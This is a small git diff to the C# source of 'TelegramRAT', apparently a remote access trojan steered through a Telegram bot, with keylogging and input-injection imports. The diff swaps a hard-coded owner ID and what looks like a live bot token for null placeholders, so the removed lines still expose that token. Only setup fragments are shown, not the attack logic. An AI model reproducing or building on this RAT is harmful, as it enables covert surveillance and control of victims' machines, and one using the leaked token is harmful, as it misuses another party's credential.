@@ -15,7 +15,6 @@ using WindowsInput;
 using System.Reflection;
 using System.Text;
 using NAudio.Wave;
-using Telegram.Bot.Types.ReplyMarkups;
 
 
 namespace TelegramRAT
@@ -24,8 +23,8 @@ namespace TelegramRAT
     {
         static TelegramBotClient Bot;
 
-        readonly static long? OwnerId = 1113634091; // Place your Telegram id here or keep it null
-        readonly static string BotToken = "1727211141:AAFgdia7tmGOzdeaPT_H0ZSlwe3PS2GnSlc"; // Place your Telegram bot token. 
+        readonly static long? OwnerId = null; // Place your Telegram id here or keep it null
+        readonly static string BotToken = null; // Place your Telegram bot token. 
 
         static List<BotCommand> commands = new List<BotCommand>();
         static bool keylog = false;
